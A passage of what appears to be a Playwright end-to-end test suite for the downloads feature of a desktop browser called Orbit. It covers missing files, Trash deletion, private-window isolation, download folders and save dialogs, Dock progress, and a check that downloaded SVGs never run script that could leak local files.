    expect(await run(orbit.app, 'downloads.open', { id }), `opening ${name}`).toBe(false)
  }
  expect(await hooks((h) => h.opened)).toEqual([])
  // Both stay listed, as "File Missing".
  expect((await list()).map((d) => `${d.filename}: ${(d as DownloadEntry).missing}`).sort()).toEqual([
    'moved.csv: true',
    'written.csv: true',
  ])
  // Its own file back in place (a move keeps its date): it is the download's again.
  rmSync(moved)
  renameSync(away, moved)
  expect((await entry('moved.csv')).missing).toBeUndefined()
  expect(await run(orbit.app, 'downloads.open', { id: await idOf('moved.csv') })).toBe(true)
  await expect.poll(() => hooks((h) => h.opened)).toEqual([moved])
})

test('[DL-04][DL-13] a downloaded SVG opens in its app, never as a page whose script could read other files', async () => {
  const { page } = await openPage()
  await startDownloads(page, '/attach/pic.svg', '/attach/chart.svg', '/attach/note.txt')
  await expect.poll(async () => (await list()).filter((d) => d.state === 'completed').length).toBe(3)
  // A file of the user's beside them: a script running in a file: page could read it.
  writeFileSync(join(folder(), 'secret.txt'), 'TOP-SECRET-LOCAL-FILE')
  const tabs = await tabCount()
  const opened = () => hooks((h) => h.opened)
  /** Until the file has gone to its app, or its script has sent something. */
  const handled = (name: string) =>
    expect
      .poll(
        async () =>
          server.leaks().some((l) => l.startsWith(`${name}:`)) || (await opened()).includes(join(folder(), name)),
      )
      .toBe(true)
  // Clicked in the sidebar, the recent files or the flyout (downloads.open)…
  expect(await run(orbit.app, 'downloads.open', { id: await idOf('pic.svg') })).toBe(true)
  await handled('pic.svg')
  expect.soft(server.leaks(), 'what opening pic.svg sent').toEqual([])
  // …or previewed from the Library (a Peek).
  expect(await run(orbit.app, 'downloads.preview', { id: await idOf('chart.svg'), tab: false })).toBe(true)
  await handled('chart.svg')
  expect.soft(server.leaks(), 'what previewing chart.svg sent').toEqual([])
  expect(await opened()).toEqual([join(folder(), 'pic.svg'), join(folder(), 'chart.svg')])
  // No tab or Peek shows either.
  expect(await tabCount()).toBe(tabs)
  const win = Object.values((await state(orbit.app)).windows)[0]
  expect(win?.overlay?.kind ?? 'none').toBe('none')
  // Plain text still opens in a tab, as text: the markup in it shows, and its script never runs.
  expect(await run(orbit.app, 'downloads.open', { id: await idOf('note.txt') })).toBe(true)
  const text = await tabPage(orbit.app, 'note.txt')
  await expect.poll(() => text.evaluate(() => document.contentType)).toBe('text/plain')
  expect(await text.evaluate(() => document.querySelectorAll('script').length)).toBe(0)
  await expect(text.locator('body')).toContainText('<script>')
  expect(server.leaks()).toEqual([])
})

test('[DL-08] Remove from List keeps the file; Delete File moves it to the Trash', async () => {
  const { page } = await openPage()
  await startDownloads(page, '/file/keep.csv?size=1000', '/file/trash.csv?size=1000')
  await expect.poll(async () => (await list()).filter((d) => d.state === 'completed').length).toBe(2)
  await run(orbit.app, 'downloads.remove', { id: await idOf('keep.csv') })
  expect((await list()).map((d) => d.filename)).toEqual(['trash.csv'])
  expect(existsSync(join(folder(), 'keep.csv'))).toBe(true)
  // The Trash can't take it: the file and its entry stay, and Orbit says so.
  const id = await idOf('trash.csv')
  await orbit.app.evaluate(() => {
    ;(globalThis as unknown as { __orbitDownloads: { trashFails?: boolean } }).__orbitDownloads.trashFails = true
  })
  expect(await run(orbit.app, 'downloads.delete', { id })).toBe(false)
  await expect(
    orbit.shell.getByTestId('toast').filter({ hasText: "Couldn't move trash.csv to the Trash" }),
  ).toHaveCount(1)
  expect(existsSync(join(folder(), 'trash.csv'))).toBe(true)
  expect((await list()).map((d) => d.filename)).toEqual(['trash.csv'])
  await orbit.app.evaluate(() => {
    ;(globalThis as unknown as { __orbitDownloads: { trashFails?: boolean } }).__orbitDownloads.trashFails = false
  })
  expect(await run(orbit.app, 'downloads.delete', { id })).toBe(true)
  expect(await list()).toEqual([])
  expect(existsSync(join(folder(), 'trash.csv'))).toBe(false)
  const trash = await hooks((h) => h.trash)
  expect(readdirSync(trash).filter((f) => f.endsWith('trash.csv'))).toHaveLength(1)
})

test('[DL-08] Clear all takes finished downloads off the list; running and resumable ones stay; files stay', async () => {
  const { page } = await openPage()
  await startDownloads(
    page,
    '/file/done.csv?size=1000',
    `/held/running.bin?size=${MB}`,
    `/cut/failed.bin?size=${MB}&plain`,
    `/cut/resumable.bin?size=${MB}`,
  )
  await expect.poll(async () => (await named('done.csv'))?.state).toBe('completed')
  await expect.poll(async () => (await named('failed.bin'))?.state, { timeout: 15_000 }).toBe('interrupted')
  await expect.poll(async () => (await named('resumable.bin'))?.state, { timeout: 15_000 }).toBe('interrupted')
  await expect.poll(async () => (await named('running.bin'))?.state).toBe('progressing')
  expect((await entry('resumable.bin')).canResume).toBe(true)
  expect((await entry('failed.bin')).canResume).toBe(false)
  expect(await run(orbit.app, 'downloads.clear', {})).toBe(2)
  expect((await list()).map((d) => d.filename).sort()).toEqual(['resumable.bin', 'running.bin'])
  expect(existsSync(join(folder(), 'done.csv'))).toBe(true)
  await expect.poll(() => existsSync(join(folder(), 'failed.bin.crdownload'))).toBe(false)
  // The sidebar keeps both (it lists them only while hovered: count them, not the rows it shows).
  await expect(orbit.shell.getByTestId('downloads-tray')).toHaveAttribute('data-count', '2')
  // The one kept for later still continues where it stopped.
  server.repair('resumable.bin')
  expect(await run(orbit.app, 'downloads.resume', { id: await idOf('resumable.bin') })).toBe(true)
  await expect.poll(async () => (await named('resumable.bin'))?.state).toBe('completed')
  server.release('running.bin')
  await expect.poll(async () => (await named('running.bin'))?.state).toBe('completed')
})

// ---- DL-16: Peek, Mini Windows and private sessions ----

test('[DL-16] downloads from a Peek and a Mini Window are like any other', async () => {
  const { tabId } = await openPage()
  const tabs = await tabCount()
  await recordAnimations()
  const peek = (await run(orbit.app, 'peek.open', { url: server.url('/page/Peeked') })) as string
  const peekPage = await tabPage(orbit.app, '/page/Peeked')
  await expect(peekPage.locator('#title')).toHaveText('Peeked')
  await peekPage.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  // The Peek stays open on its page; no tab was added.
  const windowId = Object.keys((await state(orbit.app)).windows)[0] as string
  expect((await state(orbit.app)).windows[windowId]?.overlay).toMatchObject({ kind: 'peek', tabId: peek })
  expect(await tabCount()).toBe(tabs + 1)
  await run(orbit.app, 'peek.close', {})
  await run(orbit.app, 'mini.open', { url: server.url('/page/Mini') })
  const miniPage = await tabPage(orbit.app, '/page/Mini')
  await expect(miniPage.locator('#title')).toHaveText('Mini')
  await startDownloads(miniPage, '/file/from-mini.csv?size=2048')
  await expect.poll(async () => (await named('from-mini.csv'))?.state).toBe('completed')
  expect((await list()).map((d) => d.filename)).toEqual(['from-mini.csv', 'data.csv'])
  // A Mini Window has no sidebar: the main window shows each start.
  await expect.poll(async () => (await animations('download-flight')).length).toBe(2)
  expect(await activeTabId(orbit.app)).toBe(tabId)
})

test("[DL-16] a private window lists its own session's downloads only, in no saved list, until the last one closes", async () => {
  await recordFeedback()
  // A normal window's download, still coming.
  const { page } = await openPage()
  await startDownloads(page, `/held/open.bin?size=${MB}`)
  await expect.poll(async () => (await named('open.bin'))?.state).toBe('progressing')
  // A private window's page downloads a file still coming, one paused, and a program held back (DL-12).
  const privateId = await openPrivateWindow()
  const before = await state(orbit.app)
  const privateSpace = before.windows[privateId]?.spaceId as string
  const priv = before.spaces[privateSpace]?.profileId as string
  const partition = before.profiles[priv]?.partition as string
  await cmdIn(orbit.app, privateId, 'tabs.create', { url: server.url('/page/Secret') })
  const secret = await tabPage(orbit.app, '/page/Secret')
  await expect(secret.locator('#title')).toHaveText('Secret')
  await startDownloads(
    secret,
    `/held/secret.bin?size=${MB}`,
    `/held/paused.bin?size=${MB}`,
    '/file/setup.exe?size=2048',
  )
  const states = async () =>
    (await list(priv)).map((d) => `${d.filename} ${d.state}${d.danger ? ' held' : ''}${d.private ? ' private' : ''}`)
  await expect
    .poll(async () => (await states()).sort())
    .toEqual(['paused.bin progressing private', 'secret.bin progressing private', 'setup.exe completed held private'])
  await run(orbit.app, 'downloads.pause', { id: (await list(priv)).find((d) => d.filename === 'paused.bin')?.id })
  await expect.poll(async () => (await states()).sort()[0]).toBe('paused.bin paused private')
  // Each window's sidebar shows its own session's downloads only.
  const privateShell = await uiPageOf(orbit.app, 'shell', privateId)
  await expect(privateShell.getByTestId('downloads-tray')).toHaveAttribute('data-count', '3')
  await expect(orbit.shell.getByTestId('downloads-tray')).toHaveAttribute('data-count', '1')
  // So does its downloads flyout (DL-14).
  await cmdIn(orbit.app, privateId, 'downloads.flyout')
  const flyoutNames = (await uiPageOf(orbit.app, 'overlay', privateId)).getByTestId('flyout-download-name')
  await expect(flyoutNames).toHaveCount(3)
  expect((await flyoutNames.allTextContents()).sort()).toEqual(['paused.bin', 'secret.bin', 'setup.exe'])
  await cmdIn(orbit.app, privateId, 'downloads.flyout')
  await expect(flyoutNames).toHaveCount(0)
  // A file Orbit shows, opened from the private window, opens in a tab there (DL-04).
  await startDownloads(secret, '/file/secret.txt?size=64')
  await expect.poll(async () => (await list(priv)).find((d) => d.filename === 'secret.txt')?.state).toBe('completed')
  const tabsBefore = new Set(Object.keys((await state(orbit.app)).tabs))
  const txt = (await list(priv)).find((d) => d.filename === 'secret.txt') as Download
  expect(await cmdIn(orbit.app, privateId, 'downloads.open', { id: txt.id })).toBe(true)
  await expect
    .poll(async () =>
      Object.values((await state(orbit.app)).tabs)
        .filter((t) => !tabsBefore.has(t.id))
        .map((t) => [t.spaceId === privateSpace, t.profileId === priv, t.url]),
    )
    .toEqual([[true, true, pathToFileURL(join(folder(), 'secret.txt')).href]])
  // The state file is written while one runs, then again (the first write becomes the backup):
  // neither has them, nor the downloads list.
  await saveStateWhen('progressing')
  await saveState()
  expect(stateFilesMention('secret')).toEqual([false, false])
  await hooks((h) => h.settle())
  const saved = join(orbit.userData, 'downloads.json')
  expect(existsSync(saved) ? readFileSync(saved, 'utf8') : '').not.toMatch(/secret|setup/)
  // Its pages close, the window stays open: its downloads stay listed.
  for (const t of Object.values((await state(orbit.app)).tabs).filter((t) => t.profileId === priv)) {
    await cmdIn(orbit.app, privateId, 'tabs.close', { tabId: t.id })
  }
  await expect.poll(() => pagesIn(partition)).toBe(0)
  expect((await windowList(orbit.app)).map((w) => w.kind)).toEqual(['main', 'private'])
  expect(await listedIn(priv)).toEqual(['paused.bin', 'secret.bin', 'secret.txt', 'setup.exe'])
  await expect(privateShell.getByTestId('downloads-tray')).toHaveAttribute('data-count', '3')
  // The last private window closes: its downloads leave every list. Its files stay, but for the
  // paused one and the program never kept (DL-12); the one still coming is saved, then leaves too.
  const partials = () => ['paused.bin', 'setup.exe'].map((name) => existsSync(join(folder(), `${name}.crdownload`)))
  expect(partials()).toEqual([true, true])
  await closeWindow(orbit.app, privateId)
  await expect.poll(async () => (await windowList(orbit.app)).map((w) => w.kind)).toEqual(['main'])
  await expect.poll(() => listedIn(priv)).toEqual(['secret.bin'])
  await expect.poll(partials).toEqual([false, false])
  expect(sizeOf(join(folder(), 'secret.txt'))).toBe(64)
  server.release('secret.bin')
  await expect.poll(() => listedIn(priv)).toEqual([])
  expect(sizeOf(join(folder(), 'secret.bin'))).toBe(MB)
  // The normal window's download carries on, alone in its list and its sidebar.
  expect(Object.values((await state(orbit.app)).downloads).map((d) => d.filename)).toEqual(['open.bin'])
  server.release('open.bin')
  await expect.poll(async () => (await list()).map((d) => `${d.filename} ${d.state}`)).toEqual(['open.bin completed'])
  // Each start showed in its own window only (DL-02); nothing else was said anywhere.
  expect(await feedbackSent()).toEqual([
    'main downloads.started open.bin',
    'private downloads.started paused.bin',
    'private downloads.started secret.bin',
    'private downloads.started secret.txt',
    'private downloads.started setup.exe',
  ])
})

/** Opens a private window (NV-11) and returns its id. */
async function openPrivateWindow(): Promise<string> {
  const before = new Set((await windowList(orbit.app)).map((w) => w.id))
  await action(orbit.app, 'window.newPrivate')
  await expect.poll(async () => (await windowList(orbit.app)).filter((w) => !before.has(w.id)).length).toBe(1)
  const win = (await windowList(orbit.app)).find((w) => !before.has(w.id))
  expect(win?.kind).toBe('private')
  return win?.id as string
}

/** The file names in a profile's downloads list, a private session's too (DL-16). */
const listedIn = (profileId: string) =>
  orbit.app.evaluate(
    (_e, p) =>
      (globalThis as unknown as { __orbitDownloads: { listed: (p: string) => string[] } }).__orbitDownloads
        .listed(p)
        .sort(),
    profileId,
  )

/** How many pages a session partition has open. */
const pagesIn = (partition: string) =>
  orbit.app.evaluate(({ session, webContents }, part) => {
    const ses = session.fromPartition(part)
    return webContents.getAllWebContents().filter((wc) => !wc.isDestroyed() && wc.session === ses).length
  }, partition)

/**
 * Records what windows are told of downloads from now on (DL-02's start, toasts), as `<window kind>
 * <channel> <file name or message>`.
 */
async function recordFeedback(): Promise<void> {
  await orbit.app.evaluate(() => {
    const { ctx } = (globalThis as unknown as { __orbit: { ctx: MainContext } }).__orbit
    const sent: string[] = []
    ;(globalThis as unknown as { __feedback: string[] }).__feedback = sent
    const send = ctx.windows.sendToWindow.bind(ctx.windows)
    ctx.windows.sendToWindow = (windowId, channel, payload) => {
      if (channel === 'downloads.started' || channel === 'toast') {
        const told = payload as { filename?: string; message?: string }
        sent.push(`${ctx.store.state.windows[windowId]?.kind} ${channel} ${told.filename ?? told.message}`)
      }
      send(windowId, channel, payload)
    }
  })
}

const feedbackSent = () =>
  orbit.app.evaluate(() => [...(globalThis as unknown as { __feedback: string[] }).__feedback].sort())

type StateHandle = { __orbit: { flush: () => void; state: () => OrbitState } }

/** Writes Orbit's state file now; the file it replaces becomes its backup. */
const saveState = () => orbit.app.evaluate(() => (globalThis as unknown as StateHandle).__orbit.flush())

/**
 * Writes Orbit's state file as soon as a private session's download is in `downloadState` (DL-16),
 * in the same task: its row is in the state written.
 */
async function saveStateWhen(downloadState: Download['state']): Promise<void> {
  await expect
    .poll(() =>
      orbit.app.evaluate((_e, wanted) => {
        const main = (globalThis as unknown as StateHandle).__orbit
        if (!Object.values(main.state().downloads).some((d) => d.private && d.state === wanted)) return false
        main.flush()
        return true
      }, downloadState),
    )
    .toBe(true)
}

/** Whether Orbit's state file and its backup mention a file name, or a private session's download. */
function stateFilesMention(filename: string): [boolean, boolean] {
  const file = join(orbit.userData, 'orbit-state.json')
  return [file, `${file}.bak`].map((path) => {
    expect(existsSync(path), path).toBe(true)
    const text = readFileSync(path, 'utf8')
    return text.includes(filename) || text.includes('"private":true')
  }) as [boolean, boolean]
}

// ---- DL-07: where downloads go ----

/** The save dialogs shown so far: where each opened, and the folder it asked instead of. */
const saveDialogs = () => hooks((h) => h.saveDialogs)

/** Answers the oldest save dialog still open: a path, or null for Cancel. */
async function answerSave(path: string | null): Promise<void> {
  const answered = await orbit.app.evaluate(
    (_e, p) =>
      (
        globalThis as unknown as { __orbitDownloads: { answerSave: (p: string | null) => boolean } }
      ).__orbitDownloads.answerSave(p),
    path,
  )
  expect(answered, 'a save dialog is open').toBe(true)
}

/** What the folder picker (Download location → Other…) answers next. */
async function willPickFolder(path: string | null): Promise<void> {
  await orbit.app.evaluate((_e, p) => {
    ;(globalThis as unknown as { __orbitDownloads: { pickFolder?: string | null } }).__orbitDownloads.pickFolder = p
  }, path)
}

const profile = async (profileId = 'p-default') => (await state(orbit.app)).profiles[profileId]
/** A folder of the test's own, beside Orbit's data. */
const newFolder = (name: string) => {
  const dir = join(orbit.userData, name)
  mkdirSync(dir, { recursive: true })
  return dir
}

test('[DL-07] Settings → Profiles: each profile has its download folder; Other… picks one; downloads go there', async () => {
  const work = (await run(orbit.app, 'profiles.create', { name: 'Work' })) as string
  const settings = await openSettings(orbit.app, { section: 'profiles', profileId: 'p-default' })
  const select = settings.getByTestId('download-location-p-default')
  await expect(select).toHaveValue('folder')
  await expect(select.locator('option')).toHaveText(['Downloads', 'Other…', 'Ask every time'])
  await expect(settings.getByTestId('download-folder-p-default')).toHaveText(folder())
  await expect(settings.getByTestId('setting-download-location').locator('.st-scope')).toHaveText('Default')
  // Other…, cancelled: nothing changes.
  await select.selectOption('other')
  await expect.poll(() => hooks((h) => h.folderPicks.length)).toBe(1)
  await expect(select).toHaveValue('folder')
  expect((await profile())?.downloadFolder).toBeUndefined()
  // Other…, a folder picked: it opened at the current folder; the new one shows.
  const chosen = newFolder('Chosen')
  await willPickFolder(chosen)
  await select.selectOption('other')
  await expect(settings.getByTestId('download-folder-p-default')).toHaveText(chosen)
  await expect(select.locator('option').first()).toHaveText('Chosen')
  await expect(select).toHaveValue('folder')
  expect(await hooks((h) => h.folderPicks)).toEqual([folder(), folder()])
  // A new profile starts with the OS Downloads folder.
  await settings.getByTestId(`profile-${work}`).click()
  await expect(settings.getByTestId(`download-location-${work}`)).toHaveValue('folder')
  await expect(settings.getByTestId(`download-folder-${work}`)).toHaveText(folder())

  // Each profile's downloads go to its folder, without asking.
  const { page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  expect((await named('data.csv'))?.savePath).toBe(join(chosen, 'data.csv'))
  expect(readdirSync(chosen)).toEqual(['data.csv'])
  await run(orbit.app, 'spaces.create', { name: 'Work', profileId: work, activate: true })
  const { page: workPage } = await openPage('Work')
  await workPage.locator('#attachment').click()
  await expect.poll(async () => (await list(work))[0]?.state).toBe('completed')
  expect((await list(work))[0]?.savePath).toBe(join(folder(), 'data.csv'))
  expect(await saveDialogs()).toEqual([])
})

test('[DL-07] Ask every time: each download asks where to save; the dialog opens where the last one went, also after a restart', async () => {
  const settings = await openSettings(orbit.app, { section: 'profiles', profileId: 'p-default' })
  await settings.getByTestId('download-location-p-default').selectOption('ask')
  await expect.poll(async () => (await profile())?.downloadAsk).toBe(true)
  await expect(settings.getByTestId('setting-download-location')).toContainText('Orbit asks where to save')

  const { page } = await openPage()
  await page.locator('#attachment').click()
  // The first opens in the profile's folder; the download shows nowhere until it has a place.
  await expect.poll(saveDialogs).toEqual([{ defaultPath: join(folder(), 'data.csv') }])
  expect(await list()).toEqual([])
  await expect(rows()).toHaveCount(0)
  const mine = newFolder('Mine')
  await answerSave(join(mine, 'figures.csv'))
  await expect.poll(async () => (await named('figures.csv'))?.state).toBe('completed')
  expect((await named('figures.csv'))?.savePath).toBe(join(mine, 'figures.csv'))
  expect(readFileSync(join(mine, 'figures.csv')).length).toBe(4096)
  // Nothing is left where it downloaded meanwhile.
  expect(readdirSync(folder())).toEqual([])

  // The next opens where the last one went. Cancel drops it: no file, no entry.
  await page.locator('#attachment').click()
  await expect.poll(async () => (await saveDialogs()).length).toBe(2)
  expect((await saveDialogs())[1]).toEqual({ defaultPath: join(mine, 'data.csv') })
  await answerSave(null)
  await expect.poll(() => readdirSync(mine)).toEqual(['figures.csv'])
  expect((await list()).map((d) => d.filename)).toEqual(['figures.csv'])

  // After a restart it still opens there. A file held back as harmful waits beside its place (DL-12).
  const { userData } = orbit
  await orbit.app.close()
  orbit = await launchOrbit({ userData })
  const again = await openPage()
  await startDownloads(again.page, '/file/setup.exe?size=2048')
  await expect.poll(saveDialogs).toEqual([{ defaultPath: join(mine, 'setup.exe') }])
  await answerSave(join(mine, 'setup.exe'))
  await expect.poll(async () => (await named('setup.exe'))?.danger).toBe('file-type')
  expect(readdirSync(mine).sort()).toEqual(['figures.csv', 'setup.exe.crdownload'])
  expect(await run(orbit.app, 'downloads.keep', { id: await idOf('setup.exe') })).toBe(true)
  expect(readdirSync(mine).sort()).toEqual(['figures.csv', 'setup.exe'])
})

test('[DL-07][DL-04][DL-08] a download saved over an older one\'s file: the older one shows "File Missing" and never deletes it', async () => {
  await run(orbit.app, 'downloads.setAsk', { profileId: 'p-default', ask: true })
  const { page } = await openPage()
  const target = join(newFolder('Chosen'), 'report.csv')
  await startDownloads(page, '/file/report.csv?size=1000')
  await expect.poll(async () => (await saveDialogs()).length).toBe(1)
  await answerSave(target)
  await expect.poll(async () => (await named('report.csv'))?.state).toBe('completed')
  const older = await idOf('report.csv')
  // The next goes to the same place: the save dialog asked before replacing the file there.
  await startDownloads(page, '/file/report.csv?size=2000')
  await expect.poll(async () => (await saveDialogs()).length).toBe(2)
  await answerSave(target)
  await expect.poll(async () => (await list()).filter((d) => d.state === 'completed').length).toBe(2)
  const byId = async (id: string) => (await list()).find((d) => d.id === id) as DownloadEntry
  const newer = (await list()).find((d) => d.id !== older)?.id as string
  expect((await byId(newer)).savePath).toBe(target)
  expect(statSync(target).size).toBe(2000)
  // The file there is the newer one's: the older one neither deletes nor opens it, and shows "File Missing".
  expect(await run(orbit.app, 'downloads.delete', { id: older }), 'deleting the older one').toBe(false)
  expect(sizeOf(target)).toBe(2000)
  expect((await byId(older)).missing).toBe(true)
  expect((await byId(newer)).missing).toBeUndefined()
  expect(await run(orbit.app, 'downloads.open', { id: older }), 'opening the older one').toBe(false)
  expect(await hooks((h) => h.opened)).toEqual([])
  // Also after a restart.
  const { userData } = orbit
  await orbit.app.close()
  orbit = await launchOrbit({ userData })
  expect((await byId(older)).missing).toBe(true)
  expect(await run(orbit.app, 'downloads.delete', { id: older })).toBe(false)
  expect(sizeOf(target)).toBe(2000)
  // The newer one's own file goes to the Trash with it.
  expect(await run(orbit.app, 'downloads.delete', { id: newer })).toBe(true)
  expect(existsSync(target)).toBe(false)
  expect((await list()).map((d) => d.id)).toEqual([older])
})

test('[DL-07] a chosen folder is used, never the one last used with Ask every time; a folder that cannot be used asks', async () => {
  await run(orbit.app, 'downloads.setAsk', { profileId: 'p-default', ask: true })
  const { page } = await openPage()
  const asked = newFolder('Asked')
  await page.locator('#attachment').click()
  await expect.poll(async () => (await saveDialogs()).length).toBe(1)
  await answerSave(join(asked, 'data.csv'))
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  // A folder chosen: downloads go there without asking, also after a restart.
  const chosen = newFolder('Chosen')
  await willPickFolder(chosen)
  expect(await run(orbit.app, 'downloads.chooseFolder', { profileId: 'p-default' })).toBe(chosen)
  expect(await run(orbit.app, 'downloads.location', { profileId: 'p-default' })).toEqual({ folder: chosen, ask: false })
  await startDownloads(page, '/file/second.csv?size=2048')
  await expect.poll(async () => (await named('second.csv'))?.state).toBe('completed')
  expect((await named('second.csv'))?.savePath).toBe(join(chosen, 'second.csv'))
  const { userData } = orbit
  await orbit.app.close()
  orbit = await launchOrbit({ userData })
  const again = await openPage()
  await startDownloads(again.page, '/file/third.csv?size=2048')
  await expect.poll(async () => (await named('third.csv'))?.state).toBe('completed')
  expect((await named('third.csv'))?.savePath).toBe(join(chosen, 'third.csv'))
  expect(await saveDialogs()).toEqual([])
  expect(readdirSync(asked)).toEqual(['data.csv'])

  // A folder that can't be written to (a drive that's gone): the save dialog asks, in the OS
  // Downloads folder, and says why. Nothing is saved anywhere until then.
  const blocked = join(orbit.userData, 'not-a-folder')
  writeFileSync(blocked, 'a file')
  await willPickFolder(join(blocked, 'Downloads'))
  await run(orbit.app, 'downloads.chooseFolder', { profileId: 'p-default' })
  await startDownloads(again.page, '/file/fourth.csv?size=2048')
  await expect
    .poll(saveDialogs)
    .toEqual([{ defaultPath: join(folder(), 'fourth.csv'), unavailable: join(blocked, 'Downloads') }])
  expect(await named('fourth.csv')).toBeUndefined()
  await answerSave(join(chosen, 'fourth.csv'))
  await expect.poll(async () => (await named('fourth.csv'))?.state).toBe('completed')
  expect(readdirSync(chosen).sort()).toEqual(['fourth.csv', 'second.csv', 'third.csv'])
  expect(readdirSync(asked)).toEqual(['data.csv'])
})

// ---- DL-17: the Dock and the taskbar ----

test('[DL-17] the Dock and taskbar show the progress; a download finishing in the background bounces once and notifies', async () => {
  const shown = () =>
    hooks((h) => (h.dock.progress ? [Math.round(h.dock.progress.value * 100), h.dock.progress.mode] : null))
  expect(await shown()).toBeNull()
  const { page } = await openPage()
  await page.locator('#held').click()
  await expect.poll(shown).toEqual([50, 'normal'])
  const id = await idOf('big.bin')
  await run(orbit.app, 'downloads.pause', { id })
  await expect.poll(shown).toEqual([50, 'paused'])
  await run(orbit.app, 'downloads.resume', { id })
  await expect.poll(shown).toEqual([50, 'normal'])
  // Orbit in the background: done, the bar goes, the Dock bounces once, a notification says so.
  await orbit.app.evaluate(() => {
    ;(globalThis as unknown as { __orbitDownloads: { dock: { focused?: boolean } } }).__orbitDownloads.dock.focused =
      false
  })
  server.release('big.bin')
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('completed')
  await expect.poll(shown).toBeNull()
  expect(await hooks((h) => [h.dock.bounces, h.dock.notifications])).toEqual([
    1,
    [{ title: 'Download complete', body: 'big.bin' }],
  ])
  // In front: no bounce, no notification.
  await orbit.app.evaluate(() => {
    ;(globalThis as unknown as { __orbitDownloads: { dock: { focused?: boolean } } }).__orbitDownloads.dock.focused =
      true
  })
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  expect(await hooks((h) => h.dock.bounces)).toBe(1)
})

// ---- DL-05, DL-06, DL-09 to DL-12, DL-14: the Library's sections, recent files, the flyout, safety ----

/** The Library's own view (`?view=library`), once it has been created. */
async function libraryPage(): Promise<Page> {
  const deadline = Date.now() + 20_000
  while (Date.now() < deadline) {
    const found = orbit.app.windows().find((p) => p.url().includes('view=library'))
    if (found) return found
    await new Promise((r) => setTimeout(r, 100))
  }
  throw new Error('No library page')
}

/** Opens the Library on a section and waits until it shows it. */
async function openLibrary(section: string): Promise<Page> {
  await run(orbit.app, 'library.open', { section })
  const lib = await libraryPage()
  await expect(lib.getByTestId('library')).toHaveAttribute('data-open', 'true')
  await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', section)
  return lib
}

/** Downloads a picture the page draws (a real PNG, so it shows). */
async function downloadPicture(page: Page, name: string): Promise<void> {
  await page.evaluate(async (n) => {
    const c = document.createElement('canvas')
    c.width = 64
    c.height = 48
    const g = c.getContext('2d') as CanvasRenderingContext2D
    g.fillStyle = '#3a7'
    g.fillRect(0, 0, 64, 48)
    const blob = await new Promise<Blob>((r) => c.toBlob((b) => r(b as Blob), 'image/png'))
    const a = document.createElement('a')
    a.href = URL.createObjectURL(blob)
    a.download = n
    document.body.append(a)
    a.click()
    a.remove()
  }, name)
  await expect.poll(async () => (await named(name))?.state).toBe('completed')
}

/** Downloads a short video the page records (a real WebM, so it plays). */
async function downloadVideo(page: Page, name: string): Promise<void> {
  await page.evaluate(async (n) => {
    const c = document.createElement('canvas')
    c.width = 64
    c.height = 48
    const g = c.getContext('2d') as CanvasRenderingContext2D
    let hue = 0
    const draw = setInterval(() => {
      hue += 30
      g.fillStyle = `hsl(${hue}, 70%, 50%)`
      g.fillRect(0, 0, 64, 48)
    }, 40)
    const recorder = new MediaRecorder(c.captureStream(25), { mimeType: 'video/webm;codecs=vp8' })
    const chunks: Blob[] = []
    recorder.ondataavailable = (e) => chunks.push(e.data)
    recorder.start(100)
    await new Promise((r) => setTimeout(r, 800))
    const stopped = new Promise((r) => {
      recorder.onstop = r
    })
    recorder.stop()
    await stopped
    clearInterval(draw)
    const a = document.createElement('a')
    a.href = URL.createObjectURL(new Blob(chunks, { type: 'video/webm' }))
    a.download = n
    document.body.append(a)
    a.click()
    a.remove()
  }, name)
  await expect.poll(async () => (await named(name))?.state).toBe('completed')
}

/** The URL of the web contents that has the keyboard. */
const focusedUrl = () => orbit.app.evaluate(({ webContents }) => webContents.getFocusedWebContents()?.getURL() ?? '')

/**
 * Presses keys where the keyboard is (the focused web contents), through the browser's input
 * handling where Orbit's shortcuts listen. Returns the URL of the contents that got them.
 */
function pressFocused(accel: string): Promise<string> {
  return orbit.app.evaluate(
    ({ webContents }, [keys, mac]) => {
      const contents = webContents.getFocusedWebContents()
      if (!contents) return ''
      const parts = keys.split('+')
      const keyCode = parts.pop() as string
      const modifiers = parts.map((m) => (m === 'Mod' ? (mac ? 'meta' : 'control') : m.toLowerCase())) as (
        | 'shift'
        | 'control'
        | 'alt'
        | 'meta'
      )[]
      contents.sendInputEvent({ type: 'keyDown', keyCode, modifiers })
      contents.sendInputEvent({ type: 'keyUp', keyCode, modifiers })
      return contents.getURL()
    },
    [accel, isMac] as const,
  )
}

const libraryRow = (lib: Page, filename: string) => lib.locator(`[data-testid="library-download"][title="${filename}"]`)
const dragged = () => hooks((h) => (h as unknown as { dragged: string[] }).dragged)
/** The overlay of the (only) window: a Peek, a panel such as the downloads flyout, or none. */
const overlayKind = async () => Object.values((await state(orbit.app)).windows)[0]?.overlay

test("[DL-10] the Library's Downloads section lists the profile's downloads newest first by day, with size and site", async () => {
  const { page } = await openPage()
  await startDownloads(page, '/file/data.csv?size=4096', '/file/notes.zip?size=2048')
  await expect.poll(async () => (await list()).filter((d) => d.state === 'completed').length).toBe(2)
  await downloadPicture(page, 'photo.png')
  await page.locator('#held').click()
  await expect.poll(async () => (await named('big.bin'))?.receivedBytes).toBe(2 * MB)
  const lib = await openLibrary('downloads')
  await expect(lib.getByTestId('library-download')).toHaveCount(4)
  await expect(lib.getByTestId('library-download-name')).toHaveText(['big.bin', 'photo.png', 'notes.zip', 'data.csv'])
  await expect(lib.getByTestId('downloads-day')).toHaveText(['Today'])
  await expect(libraryRow(lib, 'data.csv').getByTestId('library-download-status')).toHaveText('4 KB')
  await expect(libraryRow(lib, 'data.csv')).toContainText(new URL(server.url('/')).host)
  // A running one shows its progress, as it goes.
  await expect(libraryRow(lib, 'big.bin').getByTestId('library-download-status')).toHaveText('2 MB of 4 MB')
  server.release('big.bin')
  await expect(libraryRow(lib, 'big.bin').getByTestId('library-download-status')).toHaveText('4 MB')
  // A picture shows itself; others show their kind.
  await expect
    .poll(() =>
      libraryRow(lib, 'photo.png')
        .locator('img')
        .evaluate((img: HTMLImageElement) => img.naturalWidth),
    )
    .toBe(64)
  // Search filters by name; Esc clears it.
  await lib.getByTestId('downloads-search').fill('ZIP')
  await expect(lib.getByTestId('library-download-name')).toHaveText(['notes.zip'])
